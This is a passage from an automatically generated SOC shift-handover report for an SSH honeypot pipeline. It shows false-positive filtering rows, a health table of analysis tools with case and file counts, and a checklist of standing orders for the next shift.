| AbuseIPDB score 19 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 9 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 138 cases |
| Tool 34  | Credential Extractor        | ✅ 64 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 14 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 50 filtered (36.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 40 priority case(s) shown individually · 7 recon entry/entries in table (4 group(s) consolidating 45 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-26T20:44:12Z_
